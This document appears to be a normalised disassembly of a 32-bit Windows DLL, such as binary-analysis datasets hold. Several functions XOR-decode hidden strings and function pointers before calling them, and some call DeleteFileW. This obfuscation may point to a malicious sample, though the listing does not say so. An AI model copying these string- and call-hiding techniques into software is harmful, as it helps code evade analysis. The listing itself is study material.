call sub_1000c8b0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1003b4a6
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10040f60
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10005d00
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100146b0
push esi
push ebx
call sub_10019070
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_1000c130
mov eax [ ebp - 0x120 ]
push eax
call sub_10065045
add esp 0x14
sub_10046825
mov edi edi
push esi
call sub_10042f06
mov esi eax
push esi
call sub_1000c7e5
push esi
call sub_1001c64a
push esi
call sub_100116e3
push esi
call sub_10057822
push esi
call sub_1001be8b
push esi
call sub_100426da
add esp 0x18
pop esi
retn
sub_10046860
push ebp
mov ebp esp
push 0xffffffff
push sub_1008277c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4a0 ] eax
mov [ ebp - 0x498 ] ebx
mov [ ebp - 0x494 ] ebx
mov [ ebp - 0x490 ] ebx
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x468 ] 0x7
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
mov [ ebp - 0x460 ] ebx
mov [ ebp - 0x45c ] ebx
lea edx [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x1
push edx
mov [ ebp - 0x484 ] ebx
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0x3b
and ecx 0xff
lea eax [ ebp - 0x488 ]
push eax
xor edx edx
mov [ ebp - 0x488 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x486 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x43c ]
call sub_10024da0
test eax eax
je r-xdata
lea eax [ ebp - 0x43c ]
lea edx [ eax + 0x2 ]
cmp [ ebp - 0x468 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x43c ]
push edx
lea ecx [ ebp - 0x47c ]
call sub_1005e3c0
push edi
mov [ ebp - 0x460 ] edi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
lea ecx [ ebp - 0x47c ]
lea edi [ ebp - 0x498 ]
mov [ ebp - 0x45c ] eax
call sub_1003e740
lea edx [ ebp - 0x28 ]
mov eax 0x13b
call sub_1001bb80
push ebx
push r--data
push ebx
push ebx
push r--data
push ebx
push ebx
push ebx
push ebx
push r--data
mov ecx edx
mov edx [ ebp - 0x4a0 ]
push ecx
push ebx
push edx
push ebx
push r--data
push esi
xor edx edx
xor ecx ecx
lea esi [ ebp - 0x504 ]
call sub_1000b040
mov eax esi
push eax
lea edi [ ebp - 0x43c ]
call sub_1005e890
xor ecx ecx
mov [ ebp - 0x480 ] ebx
mov [ ebp - 0x49c ] ebx
mov [ ebp - 0x444 ] 0x7
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] cx
lea ebx [ ebp - 0x458 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10060940
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_10065045
add esp 0x4
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x49c ]
lea ebx [ ebp - 0x498 ]
lea edx [ ebp - 0x458 ]
call sub_1001cc80
test eax eax
je r-xdata
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x49c ]
cmp eax 0x1e84800
jge r-xdata
mov [ ebp - 0x484 ] 0x3
jmp r-xdata
xor eax eax
mov [ ebp - 0x458 ] ax
mov esi 0x7
xor ebx ebx
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] esi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_10054700
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_10065045
add esp 0x4
lea edx [ ebp - 0x484 ]
mov eax 0xae
call sub_1001bb80
push edx
mov eax edx
push eax
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ ebp - 0x234 ]
mov [ ebp - 0x488 ] 0x1
call sub_10024da0
test eax eax
jne r-xdata
mov ecx [ ebp - 0x480 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10010790
test eax eax
je r-xdata
mov esi [ ebp - 0x498 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
cmp esi [ ebp - 0x494 ]
je r-xdata
mov [ ebp - 0x468 ] esi
mov esi [ ebp - 0x498 ]
xor edx edx
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] dx
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_10065045
add esp 0x4
mov esi [ ebp - 0x498 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
cmp esi [ ebp - 0x494 ]
je r-xdata
mov eax [ ebp - 0x49c ]
mov ecx [ ebp - 0x480 ]
push eax
push ecx
lea eax [ ebp - 0x234 ]
call sub_1000c170
add esp 0x8
mov [ ebp - 0x488 ] eax
mov [ ebp - 0x484 ] 0x4
mov eax [ ebp - 0x480 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ ebp - 0x494 ]
jne r-xdata
mov eax 0x2
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x480 ]
xor esi esi
cmp eax esi
je r-xdata
lea ebx [ ebx ]
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
push eax
push esi
call ebx
push eax
call edi
mov [ ebp - 0x480 ] esi
cmp [ ebp - 0x488 ] esi
je r-xdata
push eax
push esi
call ebx
push eax
call edi
mov [ ebp - 0x480 ] esi
mov edx [ esi + 0x1c ]
push edx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ ebp - 0x494 ]
jne r-xdata
xor edx edx
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x458 ] dx
mov [ ebp - 0x4 ] 0x1
call sub_10054700
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov ecx [ ebp - 0x458 ]
push ecx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x234 ]
push ecx
call sub_10068660
cmp eax esi
je r-xdata
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
mov [ ebp - 0x468 ] ebx
mov ebx [ ebp - 0x498 ]
xor ecx ecx
mov [ ebp - 0x46c ] esi
mov [ ebp - 0x47c ] cx
cmp ebx esi
je r-xdata
mov eax [ ebp - 0x47c ]
push eax
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x234 ]
push ecx
call [ DeleteFileW@IAT ]
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
lea edx [ ebp - 0x234 ]
push edx
call [ DeleteFileW@IAT ]
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
xor ecx ecx
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x458 ] cx
mov [ ebp - 0x4 ] 0x1
call sub_10054700
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov eax [ ebp - 0x458 ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x484 ]
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax ebx
call sub_1001b300
push ebx
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x458 ] ax
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_10054700
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_10065045
add esp 0x4
xor ecx ecx
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x458 ] cx
mov [ ebp - 0x4 ] 0x1
call sub_10054700
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov eax [ ebp - 0x458 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x468 ] ebx
mov ebx [ ebp - 0x498 ]
xor eax eax
mov [ ebp - 0x46c ] esi
mov [ ebp - 0x47c ] ax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x47c ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0x46c ] esi
xor edx edx
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] ebx
mov [ ebp - 0x47c ] dx
call sub_1002e400
xor eax eax
mov ecx [ ebp - 0x47c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x46c ] esi
xor eax eax
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] ebx
mov [ ebp - 0x47c ] ax
call sub_1002e400
mov eax 0x6
jmp r-xdata
mov edx [ ebp - 0x47c ]
push edx
call sub_10065045
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax ebx
call sub_1001b300
push ebx
call sub_10065045
add esp 0x4
sub_10046ed0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
shl ecx 0x7
push ecx
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_10046f20
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
fld [ ebp + 0xc ]
fadd [ ebp + 0x14 ]
fstp [ ebp - 0x8 ]
jne r-xdata
call sub_10012991
push 0xffff
push [ ebp + 0x1c ]
mov [ eax ] 0x21
call sub_10042493
fld [ ebp - 0x8 ]
pop ecx
pop ecx
leave
retn
push [ ebp + 0x1c ]
fld [ ebp - 0x8 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x14 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_1000a7df
add esp 0x24
leave
retn
sub_10046f90
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov bl 0x38
push 0x0
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] edx
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov edx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
push edx
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push 0x0
push 0x0
mov [ ebp - 0x20 ] 0x3
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
call [ ebp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
lea eax [ ebp + 0x10 ]
push esi
mov [ ebp + 0x10 ] eax
call [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_10047080
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push ebx
call edx
cmp [ edi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov ebx [ DeleteFileW@IAT ]
mov eax [ edi ]
mov edx [ eax ]
mov ecx edi
call edx
cmp [ edi + 0x84 ] 0x8
lea eax [ edi + 0x70 ]
jb r-xdata
push esi
mov esi [ edi + 0xb4 ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov cl 0x38
xor [ ebp - 0x4 ] cl
xor [ ebp - 0x3 ] cl
xor [ ebp - 0x2 ] cl
xor [ ebp - 0x1 ] cl
push eax
call [ ebp - 0x4 ]
mov [ edi + 0xb0 ] 0x0
mov ebx [ DeleteFileW@IAT ]
push eax
call ebx
jmp r-xdata
mov eax [ eax ]
mov eax [ edi + 0xb4 ]
mov ecx [ edi + 0xb8 ]
cmp eax ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
add edi 0x94
cmp [ edi + 0x14 ] 0x8
pop esi
jb r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_100528d0
mov ebx [ edi + 0xb8 ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov esi eax
cmp eax ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
call ebx
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov edi [ edi ]
mov ebx [ DeleteFileW@IAT ]
mov [ edi + 0xb8 ] eax
lea ecx [ ecx ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
mov eax [ ebp - 0x4 ]
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_100471a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_100408c4
pop ecx
pop ecx
sub_100471e0
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xffb7
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0x42
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10046860
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10047277
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
call sub_100539e5
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
call sub_1001f959
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
push edi
push edi
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_1000a03a
add esp 0x24
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] eax
cmp eax ebx
jg r-xdata
cmp esi ebx
ja r-xdata
push 0x1
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_1000a03a
add esp 0x24
mov [ ebp - 0x4 ] esi
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10078600
add esp 0xc
sub_10047340
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x71c71c7
jbe r-xdata
xor al al
retn
mov ecx edi
call sub_100689c0
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edx
mov al 0x1
retn
push r--data
call sub_100616c6
sub_1004737b
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10037073
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10047418
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10054678
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10044041
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1002a905
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
sub_100474c0
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_10013870
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
